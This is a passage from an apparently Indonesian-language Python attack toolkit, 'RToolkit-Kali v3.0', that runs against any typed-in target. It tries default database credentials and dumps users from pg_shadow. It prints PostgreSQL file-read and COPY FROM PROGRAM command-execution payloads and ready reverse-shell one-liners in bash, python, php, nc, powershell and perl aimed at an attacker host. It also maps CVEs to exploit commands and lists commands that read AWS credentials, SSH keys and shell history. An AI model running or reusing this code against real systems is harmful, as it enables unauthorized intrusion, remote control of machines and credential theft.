            if "3306" in p: db_services.append({"protocol":"mysql","port":3306})
            if "1433" in p: db_services.append({"protocol":"mssql","port":1433})

    if not db_services:
        print(f"  {c('No database services detected',G)}")
        return

    for svc in db_services:
        if svc["protocol"] == "postgresql":
            print(f"\n  {c('[!] PostgreSQL (5432) TERBUKA!',R)}")
            REPORT["vulnerabilities"].append({
                "url":f"postgresql://{domain}:5432","name":"PostgreSQL Exposed","severity":"CRITICAL",
                "source":"db_check","exploit_cmd":f"psql -h {domain} -p 5432 -U postgres"})
            for user,pwd in [("postgres","postgres"),("postgres",""),("postgres","admin"),("postgres","password"),
                             ("postgres","123456"),("admin","admin"),("root","root")]:
                stdout,_,ok = run_cmd(f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -c 'SELECT 1' -t 2>/dev/null",10)
                if ok and ("SELECT 1" in stdout or "1 row" in stdout):
                    print(f"  {c('✓ LOGIN BERHASIL: '+user+':'+pwd,G)}")
                    credits = f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres"
                    REPORT["vulnerabilities"].append({
                        "url":f"postgresql://{domain}:5432","name":f"PG Default Creds: {user}:{pwd}",
                        "severity":"CRITICAL","source":"db_check","exploit_cmd":credits})
                    # Dump info
                    for label,sql in [("Databases","SELECT datname FROM pg_database WHERE datistemplate=false"),
                        ("Users","SELECT usename FROM pg_shadow"),
                        ("Tables","SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') LIMIT 10"),
                        ("Version","SELECT version()")]:
                        out,_,_ = run_cmd(f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres -c \"{sql}\" 2>/dev/null",15)
                        if out:
                            lines = [l for l in out.split('\n') if l.strip() and 'rows' not in l.lower() and '---' not in l]
                            if lines: print(f"    [{label}] {lines[1] if len(lines)>1 else lines[0][:80]}")
                    # File read + RCE
                    print(f"\n  {c('[⚡] PostgreSQL Exploit:',R)}")
                    for cmd in [
                        f"PGPASSWORD='{pwd}' psql -h {domain} -U {user} -d postgres -c \"COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;\"",
                        f"PGPASSWORD='{pwd}' psql -h {domain} -U {user} -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
                    ]:
                        print(f"    {c(cmd,DIM)}")
                    break
            else:
                print(f"  {c('Default credentials failed. Try: hydra -l postgres -P /usr/share/wordlists/rockyou.txt '+domain+' -s 5432 postgres -t 4',Y)}")

        elif svc["protocol"] == "mysql":
            print(f"\n  {c('[!] MySQL (3306) TERBUKA!',R)}")
            for user,pwd in [("root",""),("root","root"),("root","admin"),("root","password")]:
                out,_,ok = run_cmd(f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT 1' -s 2>/dev/null",10)
                if ok or "1" in out.strip():
                    print(f"  {c('✓ LOGIN: '+user+':'+pwd,G)}")
                    REPORT["vulnerabilities"].append({
                        "url":f"mysql://{domain}:3306","name":f"MySQL Default Creds: {user}:{pwd}",
                        "severity":"CRITICAL","source":"db_check",
                        "exploit_cmd":f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT schema_name FROM information_schema.schemata;'"})

# ====== PHASE 5: EXPLOITATION ENGINE ======
def phase5_exploit(domain):
    """Phase 5: Exploitation — reverse shell + exploit commands dari CVEs."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 5: EXPLOITATION ENGINE',BOLD)}")
    print(f"{c('='*65,Y)}")

    # Reverse shells
    print(f"\n  {c('[+] Reverse Shell Payloads (ganti LHOST)',G)}")
    lhost = "YOUR_IP"
    shells = [
        ("bash",f"bash -i >& /dev/tcp/{lhost}/4444 0>&1"),
        ("python",f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
        ("php",f"php -r '$sock=fsockopen(\"{lhost}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("nc",f"nc -e /bin/sh {lhost} 4444"),
        ("powershell",f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"'),
        ("perl",f"perl -e 'use Socket;$i=\"{lhost}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        ("nc_pipe",f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} 4444 >/tmp/f"),
    ]
    for name,cmd in shells:
        if len(name+cmd)<120: print(f"    {c(name+':',C)} {cmd}")
        else: print(f"    {c(name+':',C)} {cmd[:70]}...")

    # Exploit dari CVE
    if REPORT["cves"]:
        print(f"\n  {c('[⚡] Exploit Commands dari CVEs:',R)}")
        seen = set()
        exploit_map = {
            "apache": ["msfconsole -q -x 'use exploit/multi/http/apache_mod_proxy_rce; set RHOSTS "+domain+"; run'"],
            "openssh": ["python3 CVE-2024-6387.py "+domain+" 22"],
            "php": ["phpggc -p phar -o exploit.phar 'RCE:system(id)'"],
            "postgresql": ["psql -h "+domain+" -U postgres -c 'SELECT version()'"],
        }
        for cv in REPORT["cves"]:
            sw = cv["software"].lower()
            for key, cmds in exploit_map.items():
                if key in sw:
                    for cmd in cmds:
                        if cmd not in seen:
                            seen.add(cmd)
                            print(f"    {c('➜',M)} {cmd}  ({cv['cve'][:40]})")

    # Privesc
    print(f"\n  {c('[+] Linux Privesc Commands',G)}")
    for label,cmd in [("SUID","find / -perm -4000 -type f 2>/dev/null"),
        ("sudo","sudo -l 2>/dev/null"),("Cron","ls -la /etc/cron* 2>/dev/null"),
        ("Kernel","uname -a"),("SSH Keys","find / -name id_rsa -o -name id_dsa 2>/dev/null"),
        ("Docker","docker ps 2>/dev/null; groups | grep docker"),
        ("AWS","cat ~/.aws/credentials 2>/dev/null"),
        ("History","cat ~/.bash_history 2>/dev/null | tail -20"),
        ("Network","ss -tulanp 2>/dev/null || netstat -tulanp")]:
        print(f"    {c(label+':',C)} {cmd}")

# ====== PHASE 6: REPORTING ======
def phase6_report(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 6: REPORTING',BOLD)}")
    print(f"{c('='*65,Y)}")

    for v in REPORT["vulnerabilities"]:
        s = v.get("severity","INFO").upper()
        if s in REPORT["summary"]: REPORT["summary"][s] += 1
        REPORT["summary"]["total"] += 1

    s = REPORT["summary"]
    print(f"""
  {c('╔════════════════════════════════════════════════════╗',Y)}
  {c('║',Y)}  {c('📊 FINAL SCAN SUMMARY',BOLD)}                      {c('║',Y)}
  {c('╠════════════════════════════════════════════════════╣',Y)}
  {c('║',Y)}  Target:   {c(domain,W)}                   {c('║',Y)}
  {c('║',Y)}  CVEs:     {c(str(len(REPORT['cves'])),W)}                        {c('║',Y)}
  {c('║',Y)}  Vulns:    {c(str(s['total']),W)}                        {c('║',Y)}
  {c('║',Y)}  Critical: {c(str(s['critical']),R)}                          {c('║',Y)}
  {c('║',Y)}  High:     {c(str(s['high']),R)}                          {c('║',Y)}
  {c('║',Y)}  Medium:   {c(str(s['medium']),Y)}                          {c('║',Y)}
  {c('║',Y)}  Subdomains: {c(str(len(REPORT['subdomains'])),W)}                    {c('║',Y)}
  {c('║',Y)}  Services: {c(str(len(REPORT['services'])),W)}                      {c('║',Y)}
  {c('║',Y)}  Vulns Found: {c(str(len(REPORT['vulnerabilities'])),W)}                 {c('║',Y)}
  {c('╚════════════════════════════════════════════════════╝',Y)}""")

    # HTML Report
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    cve_rows = "".join(f'<tr><td>{cv["port"]}</td><td>{cv["software"]}</td><td>{cv["version"]}</td><td class="sev-{cv["severity"]}">{cv["cve"]}</td><td class="sev-{cv["severity"]}">{cv["severity"]}</td></tr>' for cv in REPORT["cves"][:100])
    vuln_rows = "".join(f'<tr><td>{v["name"][:60]}</td><td class="sev-{v.get("severity","INFO")}">{v.get("severity","INFO")}</td><td>{v.get("url","")[:60]}</td><td>{v.get("source","")}</td></tr>' for v in REPORT["vulnerabilities"][:100])
    sub_rows = "".join(f'<tr><td>{s}</td></tr>' for s in REPORT["subdomains"][:50])
    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v3.0 Report - {domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
.header h1{{color:#ff6b6b;font-size:28px}} .header .target{{color:#58a6ff;font-size:18px}}
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:24px}}
.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
.stat-box .num{{font-size:32px;font-weight:bold}} .stat-box .label{{font-size:12px;color:#8b949e}}
.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
.section-content{{padding:16px 20px}} table{{width:100%;border-collapse:collapse}}
th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
.sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
</style></head><body><div class="container">
<div class="header"><h1>RToolkit-Kali v3.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
<div class="stats">
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
<div class="stat-box"><div class="num" style="color:#d29922">{s["medium"]}</div><div class="label">Medium</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{s["low"]}</div><div class="label">Low</div></div>
<div class="stat-box"><div class="num" style="color:#8b949e">{s["total"]}</div><div class="label">Total Vulns</div></div>
</div>
<div class="section"><h2>Subdomains ({len(REPORT["subdomains"])})</h2><div class="section-content"><table><tr><th>Subdomain</th></tr>{sub_rows}</table></div></div>
<div class="section"><h2>CVEs ({len(REPORT["cves"])})</h2><div class="section-content"><table><tr><th>Port</th><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th></tr>{cve_rows}</table></div></div>
<div class="section"><h2>Vulnerabilities ({len(REPORT["vulnerabilities"])})</h2><div class="section-content"><table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>{vuln_rows}</table></div></div>
</div></body></html>"""
    html_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.html"
    with open(html_fn,"w",encoding="utf-8") as f: f.write(html)
    json_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.json"
    with open(json_fn,"w") as f: json.dump(REPORT,f,indent=2,default=str)
    print(f"\n  {c(f'📄 HTML: {html_fn}',G)}")
    print(f"  {c(f'📄 JSON: {json_fn}',G)}")

# ====== MAIN PIPELINE ======
def main():
    banner()
    RESULTS_DIR.mkdir(exist_ok=True)
    target = input(f"\n  {c('Target (domain or IP)',C)}: ").strip()
    if not target: return
    domain = target.replace('https://','').replace('http://','').split('/')[0].split('?')[0]
    REPORT["target"] = domain
    REPORT["timestamp"] = datetime.datetime.now().isoformat()
    print(f"\n  {c('══ PIPELINE SCAN — '+domain+' ══',Y)}")

    start = time.time()
    target_ip, tools = phase1_nmap(domain)
    open_ports = port_scan(target_ip) if not tools["nmap"] else []
    phase1_banner_grab(domain, target_ip, open_ports)
    all_subs = phase1_subdomains(domain, tools)
    live_urls = phase1_httpx(domain, all_subs, tools)
    phase2_discovery(live_urls, tools)
    phase3_vuln_scan(live_urls, tools)
    phase4_db(domain)
    phase5_exploit(domain)
    phase6_report(domain)

    elapsed = time.time()-start
    print(f"\n  {c('✅ Pipeline selesai dalam '+str(int(elapsed))+' detik!',G)}")
    print(f"  {c('Hasil di:',C)} {RESULTS_DIR}/")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n\n  {c('[!] Interrupted',Y)}"); sys.exit(0)
    except Exception as e: print(f"\n  {c('[!] Error: '+str(e),R)}"); import traceback; traceback.print_exc(); sys.exit(1)
